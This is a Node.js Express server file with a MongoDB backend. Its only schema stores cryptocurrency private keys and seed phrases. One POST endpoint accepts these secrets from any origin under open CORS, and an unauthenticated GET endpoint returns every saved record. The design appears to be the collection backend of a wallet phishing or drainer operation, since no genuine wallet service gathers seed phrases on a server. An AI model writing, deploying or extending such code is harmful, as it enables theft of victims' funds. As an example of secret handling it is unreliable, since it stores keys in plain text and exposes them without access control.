require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(cors());
app.use(bodyParser.json());

// Database Connection
mongoose.connect(process.env.MONGO_URI, { useNewUrlParser: true, useUnifiedTopology: true })
    .then(() => console.log("✅ MongoDB Connected"))
    .catch(err => console.error("❌ MongoDB Connection Error:", err));

// Schema & Model
const WalletSchema = new mongoose.Schema({
    privateKey: String,
    seedPhrase: String
});
const Wallet = mongoose.model('Wallet', WalletSchema);

// Save Wallet Data
app.post('/save-wallet', async (req, res) => {
    try {
        const { privateKey, seedPhrase } = req.body;
        const newWallet = new Wallet({ privateKey, seedPhrase });
        await newWallet.save();
        res.status(201).json({ message: "✅ Wallet Saved Successfully" });
    } catch (error) {
        res.status(500).json({ error: "❌ Server Error" });
    }
});

// Get Wallet Data (For Testing)
app.get('/wallets', async (req, res) => {
    const wallets = await Wallet.find();
    res.json(wallets);
});

app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
